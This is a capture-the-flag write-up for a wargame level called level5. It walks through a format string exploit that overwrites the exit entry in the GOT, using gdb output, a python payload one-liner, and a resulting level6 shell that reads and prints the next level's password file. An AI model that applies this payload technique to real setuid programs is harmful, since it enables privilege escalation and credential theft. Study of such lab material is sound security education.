# level5

## Header

```bash
ssh level5@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```

<hr>

## Solution

This level uses format string attack again, but there is no `m` variable to overwrite, so we'll overwrite `exit` address in the `GOT` table. <br>
See [disassembled code](./source.s) and [source](./source.c) file to understand more.


```bash
level5@RainFall:~$ gdb -batch -ex 'disas n' level5 | grep exit
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>

level5@RainFall:~$ gdb -batch -ex 'disas 0x80483d0' level5
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```
So, the address that resolves exit function is `0x8049838`.

The next thing we need is address of `o` function:
```bash
level5@RainFall:~$ gdb -batch -ex 'p o' level5
$1 = {<text variable, no debug info>} 0x80484a4 <o>
```

And a little trick to convert hex numbers to decimal in bash:
```bash
level5@RainFall:~$ $((0x80484a4))
134513828: command not found
```

Let's exploit now (pay attention, we subtracted 4 bytes from `o` address):
```bash
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"'; cat) | ./level5
whoami
level6
id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
pwd
/home/user/level5
cd ../level6
ls -la   
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## References
- [The video, that explains solution to almost the same problem](https://www.youtube.com/watch?v=t1LH9D5cuK4)
- [GOT and PLT](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)